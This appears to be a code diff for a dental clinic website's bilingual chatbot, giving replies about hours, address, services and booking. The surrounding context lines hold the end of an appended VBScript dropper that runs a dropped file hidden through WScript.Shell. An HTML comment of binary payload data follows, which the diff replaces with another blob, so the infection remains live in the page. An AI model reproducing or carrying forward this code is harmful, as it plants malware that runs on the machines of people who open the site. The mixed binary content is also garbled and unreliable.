+                        replyText = 'نستقبلكم يومياً من الساعة 2 ظهراً حتى 10 مساءً (بالحجز المسبق لضمان عدم الانتظار).';
+                    } else if(option === 'موقع العيادة' || option.includes('Location')) {
+                        replyText = 'عنواننا: الدقي، الجيزة - 20 شارع الثورة، الدور الرابع.<br/><a href="location.html" class="underline text-brand-accent font-semibold mt-1 inline-block">اضغط هنا لرؤية الخريطة والتفاصيل</a>';
+                    } else if(option === 'الخدمات والأسعار' || option.includes('Services')) {
+                        replyText = 'نوفر خدمات: ابتسامة هوليود، زراعة وتقويم الأسنان، والتبييض والتنظيف. تختلف التكلفة بحسب الحالة بعد الفحص والتصوير.';
+                    } else if(option === 'حجز موعد' || option.includes('Book')) {
+                        replyText = 'يمكنك اختيار الموعد المناسب لك مباشرة عبر صفحة الحجز:<br/><a href="booking.html" class="inline-block mt-2 bg-stone-900 text-white px-4 py-1.5 rounded-lg text-[10px]">الذهاب لصفحة الحجز 📅</a>';
+                    }
+                } else {
+                    if(option === 'مواعيد العمل' || option.includes('Working')) {
+                        replyText = 'We are open daily from 2:00 PM to 10:00 PM (Prior booking required to avoid wait times).';
+                    } else if(option === 'موقع العيادة' || option.includes('Location')) {
+                        replyText = 'Address: Dokki, Giza - 20 El-Thawra St, 4th Floor.<br/><a href="location.html" class="underline text-brand-accent font-semibold mt-1 inline-block">Click here to view map and directions</a>';
+                    } else if(option === 'الخدمات والأسعار' || option.includes('Services')) {
+                        replyText = 'We offer Hollywood Smile, Dental Implants, Orthodontics, Whitening & Cleaning. Exact pricing is determined after thorough examination.';
+                    } else if(option === 'حجز موعد' || option.includes('Book')) {
+                        replyText = 'You can directly choose your preferred appointment date:<br/><a href="booking.html" class="inline-block mt-2 bg-stone-900 text-white px-4 py-1.5 rounded-lg text-[10px]">Go to Booking Page 📅</a>';
+                    }
                 }
 
                 const botMsg = document.createElement('div');
@@ -282,8 +537,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--���nR��K8~��޹=��|�%����e�>�����#\ |��DL�ʂ�	<w�w	}�]B^V���h�y��w<�v�':�o��]�	^��	�CČ��)�x��!�����
-����r0p�
-��s���|Ą��=�`ij��CA���H���B��_��\k��Q��2"(����!w�(����G�W�r�9�u��U`�h4 ��s��b0��h���2�גblR����)��R]�+M��RuX��G�V=�����t�2���Y���}ki�\��$(,ܜu�mWv�X8���'�!p������1^���4�Q��l�;��z?d%+�_p;�1qEbg;G�[K�gM?C�]�>�1]t��&�w���#� =gMx��������3~-_�j5�C�X+`�x��
-Ї,��&�����j�l�s��ն�(
-[���#� ' �<R+'��<�<�<��N�P�h:�< �<-->
+//--></SCRIPT><!--�#pSW+���������>"�qbs�	53��w���'���3UXM6+�zr�'�C=����z���Y�S��b?�s0�y��7��[׼k�j1�h�Ӻ�:��xն��qt *��9O*�Ѭ�%����f�L�
+2n�#p�i';���������� l�+�t���@�����j�!2 .�O!��(�?�Jm�%7���4Ɍ%��9���ց�g�� �1)^" S�,[�iu�T��tߑGS����Z+�
+?}�B%��.��m!�b���Y|�ny�^�3�]��˫yO�^-�c�k"�j�Ƿ�\���?��ͼ89��-$ ���n�&Qn��2>��O���rp5���?�{��u|'nTuQ�W��f��|�?U�Uv68H�;:��]��l^��_L�g���1O���̴�b���K����+Z�O&�넇�Ί}-�m�iU�u���>*��ڋ�-5��jW��ؚN�5�.��!��J�]� �LR%W��L�L�L��N���hHBL �L-->
